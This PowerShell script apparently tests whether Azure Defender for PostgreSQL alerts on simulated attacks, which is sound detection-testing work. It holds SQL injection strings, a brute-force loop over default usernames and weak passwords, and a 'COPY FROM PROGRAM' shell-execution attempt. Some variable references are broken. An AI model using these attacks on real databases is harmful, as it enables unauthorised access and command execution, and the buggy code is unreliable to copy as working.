<#
.SYNOPSIS
This script is used for testing Azure Defender for Open Source databases specifically for PostgreSQL.

.DESCRIPTION
The postgresql-testdefender.ps1 script is designed to perform various tests and (hopefully) trigger alerts in Azure Defender. 
It includes functions for checking database connectivity, testing query performance, and implementing security measures.

.NOTES
Author: Remy
Version: 0.1
#>
# 

function Invoke-SqlCommandOdbc {
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$server,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$port,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$dbName,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$userName,

        # Todo: Fix to secure string
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String]$password,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$sqlCommand
    )

    # Load the ODBC .NET Data Provider
    Add-Type -AssemblyName System.Data

    # Build the connection string
    $connectionString = "Driver={PostgreSQL UNICODE};Server=$server;Port=$port;Database=$dbName;Uid=$userName;Pwd=$password;sslmode=require;application_name=SqlAtpTestApp;"
    
    try {
        # Initialize the connection
        $connection = New-Object System.Data.Odbc.OdbcConnection($connectionString)
        $connection.Open()

        # Prepare the command
        $command = $connection.CreateCommand()
        $command.CommandText = $sqlCommand

        # Execute the command
        $reader = $command.ExecuteReader()

        # Read the results
        while ($reader.Read()) {
            for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                Write-Host "$($reader.GetName($i)): $($reader.GetValue($i))"
            }
            Write-Host "-----------------------------"
        }
    }
    catch {
        Write-Error "Failed to execute SQL command: $_"
    }
    finally {
        # Clean up
        $connection.Close()
    }
}


##########################
# Test 1 - SQL Injection #
##########################
Function Test-SqlInjection
{
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$server,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$port,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$dbName,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$userName,

        [Parameter(Mandatory=$true, Position=0, HelpMessage="Supply Password?")]
        [SecureString]$passwordPrompt
    )

    $remark = New-Guid
    $unsecurePassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($password))

    # Define the SQL commands to be executed
    # Some examples added, but you can add more of course!
    $sqlCommands = @(
        "SELECT * FROM pg_tables WHERE schemaname like 'pg' OR 1=1 LIMIT 1 -- $($remark)'",
        "SELECT * FROM pg_tables WHERE schemaname like 'pg%' --$($remark)123",
        "SELECT * FROM pg_tables WHERE schemaname like '''' --$($remark)123"
    )
   
    foreach ($sqlCommand in $sqlCommands) {
        try {
            Invoke-SqlCommandOdbc -server $server -port $port -dbName $dbName -userName $userName -password $unsecurePassword -sqlCommand $sqlCommand
            Write-Host $sqlCommand
        }
        catch {
            Write-Error "Failed to execute SQL command: $_"
        }
    }
}


#################################
# Test 2 - SQL Bruteforce Login #
#################################
Function Test-SqlBruteForce {
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$server,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$port,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$dbName
    )

    # Define arrays for usernames and passwords
    # Some examples added, but you can add more of course!
    $usernames = @("pgadmin", "root", "openpg", "postgres")
    $passwords = @("openpgpwd", "newpassword", "postgres", "123456", "root11") 

    $sqlCommand = "SELECT * FROM pg_tables LIMIT 1;"

    # Loop through the usernames and passwords
    foreach ($userName in $userNames) {
        # Try to connect with the username as password
        Invoke-SqlCommandOdbc -Server $server -Port $port -DbName $dbName -UserName $userName -Password $userName -SqlCommand $sqlCommand 
        Write-Host "Attempted $sqlCommand with $username and $username"
        
        # Loop through the different password combinations
        foreach ($password in $passwords) {
            Invoke-SqlCommandOdbc -Server $server -Port $port -DbName $dbName -UserName $username -Password $password -SqlCommand $sqlCommand 
            Write-Host "Attempted $sqlCommand with $username and $password"
        }
    }
}


#################################
# Test 3 - Shell execution      #
#################################
Function Test-SqlShell {
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$server,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$port,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$dbName,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$userName,

        [Parameter(Mandatory=$true, Position=0, HelpMessage="Supply Password?")]
        [SecureString]$passwordPrompt
    )

    $unsecurePassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($password))

    # For testing purposes, need to figure out what is a valid 'abusive' scenario
    # This will result into: "ERROR [0A000] ERROR: COPY to or from an external program is not allowed in Azure Database For PostgreSQL;"
    $sqlCommands = @(
        "DROP TABLE IF EXISTS cmd_exec;",
        "CREATE TABLE cmd_exec(cmd_output text);",
        "COPY cmd_exec FROM PROGRAM 'id';",
        "SELECT * FROM cmd_exec; DROP TABLE IF EXISTS cmd_exec;"
    )
   
    foreach ($sqlCommand in $sqlCommands) {
        try {
            Invoke-SqlCommandOdbc -server $server -port $port -dbName $dbName -userName $userName -password $unsecurePassword -sqlCommand $sqlCommand
            Write-Host $sqlCommand
        }
        catch {
            Write-Error "Failed to execute SQL command: $_"
        }
    }
}


##########################
# Test 1 - SQL Injection #
##########################
#
# This function will loop through a list of SQL commands and attempt to execute them.
# Goal is to trigger alerts in Azure Defender for SQL related to SQL injection.
# Will need connectivity parameters!
 Test-SqlInjection -server "pgyourpostgresql.postgres.database.azure.com" -port "5432" -dbName "postgres" -userName "pgyouruser"


#################################
# Test 2 - SQL Bruteforce Login #
#################################
#
# This function will loop through a list of predefined users and passwords. 
# No additional parameters available.
Test-SqlBruteForce -server "pgyourpostgresql.postgres.database.azure.com" -port "5432" -dbName "postgres"


#################################
# Test 3 - Shell execution      #
#################################
#
#
# This function will attempt to execute shell commands using the PostgreSQL database.
# Simple example, needs more exploration: "ERROR [0A000] ERROR: COPY to or from an external program is not allowed in Azure Database For PostgreSQL;"
Test-SqlShell -server "pgyourpostgresql.postgres.database.azure.com" -port "5432" -dbName "postgres" -userName "pgyouruser"
